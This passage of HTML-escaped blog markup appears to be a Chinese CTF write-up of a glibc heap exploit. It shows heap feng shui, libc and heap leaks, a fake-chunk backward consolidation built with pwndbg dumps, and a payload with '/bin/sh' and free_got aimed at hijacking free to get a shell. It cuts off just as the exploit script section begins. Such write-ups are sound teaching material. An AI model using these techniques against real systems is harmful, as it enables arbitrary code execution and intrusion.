class=&#34;comment&#34;&gt;#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;ssss&amp;#x27;&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;0 用来 leak libc_base, 我们重复利用，1 我们构造了两个大小相等的堆块&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;:struct0---&amp;gt; struct1 ---&amp;gt;content1 ---&amp;gt;struct2 ---&amp;gt;struct3 ---&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x61&lt;/span&gt;:conten2 ---&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsortedbins: content0 ---&amp;gt;content3 ---&amp;gt;main_arena			&lt;span class=&#34;comment&#34;&gt;//(FIFO)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; fastbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x2368000&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x23680b0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x23680d0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x23680f0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x2368170&lt;/span&gt; ◂— ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x2368110&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsortedbin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;all: &lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fb1f48beb78&lt;/span&gt; (main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在重新申请堆块的过程中我们还要完成堆地址的泄露，这里其实有两个选择，一种是将 struct 申请作为 content，因为 free 的时候，struct.ptr 没有被清空，可以被泄露。另外一种就是不考虑时那种堆块，只要不是 fastbin 的最后一个，申请出来时，fd 指针没有被清空，此时我们输入的 content 只要时其最低字节就可以（heap 的地址最低三字节一定是 0x000，通过计算 可以得到对低字节）。content3 与 topchunk 相邻，释放后会与其合并，我们不需要考虑，因为 unsortedbin 里只有 0x90 的 content0，只要申请的堆块比他大，就会从 topchunk 获取，因为 0x21 大小的堆块在 fastbin 里面有好几个，就可以是的从 topchunk 连续获得两个较大的堆块，这样 edit 前面堆块就可以完成溢出，fake chunk 的构造需要一定的空间，所以我们使用了 0x50 的堆块。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fakechunk:&lt;span class=&#34;number&#34;&gt;0x2368120&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x0000000002368120&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368110&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000061&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368120&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000100&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000110&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//fakesize = victim_prev_size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368130&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000002368120&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000002368120&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//为了方便绕过检查，fd,bk直接指向fakechunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368140&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000002368120&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000002368120&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368150&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368160&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; fake_size = fake_prev_size = victimchunk-fakechunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x00000000023681a0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x10&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;//victimchunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368190&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000000000a1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681a0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681b0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681c0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681d0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681e0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681f0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368200&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368210&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x00000000023681a0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x10&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;//edit时覆盖victimchunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368190&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000000000a1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681a0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681b0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681c0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681d0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681e0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x23681f0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368200&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368210&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368220&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368230&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000110&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000130&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368240&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000006262&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里就完成了布局，现在只要 free victim_chunk&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/8gx 0x0000000002368120-0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x2368110:	0x0000000000000000	0x0000000000000061&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x2368120:	0x0000000000000100	0x0000000000020ee1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x2368130:	0x0000000002368120	0x0000000002368120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x2368140:	0x0000000002368120	0x0000000002368120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//此时fakechunk的size变了，其实这就是fakesize+victim_size+topchunk_size&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候我们在申请一个堆块，并填充一些东西（偏移量在调试中查看）&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pad = &lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;+ &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x180&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x130&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) +p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;) +p64(free_got)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;,pad)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;新申请的堆块就是从 fakechunk 开始分配，后面自行调试偏移量&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; EXP&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span 